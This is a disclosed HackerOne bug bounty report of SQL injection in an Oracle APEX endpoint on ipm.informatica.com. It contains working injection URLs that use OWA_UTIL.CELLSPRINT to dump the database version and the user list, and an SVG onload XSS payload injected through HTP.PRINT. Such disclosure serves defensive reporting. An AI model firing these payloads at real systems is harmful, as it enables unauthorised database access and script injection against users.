# [ipm.informatica.com] Sql injection Oracle 

## Report Details
- **Report ID**: 178057
- **URL**: https://hackerone.com/reports/178057
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2016-10-25T16:54:13.940Z
- **Disclosed**: 2017-01-21T19:05:21.226Z

## Reporter
- **Username**: e3xpl0it
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Hi host ipm.informatica.com is vulnerable to sql injection attacks the web application does not produce sufficient validation on user input.

POC
detection
request 1
http://ipm.informatica.com/pls/apex/f?1'=1  response 500 HTTP/1.1 500 Internal Server Error
request 2
http://ipm.informatica.com/pls/apex/f?1''=1 response HTTP/1.1 404 Not Found


exploitation

http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version   
  
Oracle Database 11g Release 11.2.0.3.0 - 64bit Production PL/SQL Release 11.2.0.3.0 - Production CORE 11.2.0.3.0 
Production TNS for Linux: Version 11.2.0.3.0 - Production NLSRTL Version 11.2.0.3.0 - Production 

Cross Site Scripting via sql injection 

http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive<svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')>

and etc 
http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS

## Attachments
- sql_versin_.jpg
- sql_versin_burp_.jpg
- sqli_burp_.jpg
- xss_via_sql.jpg
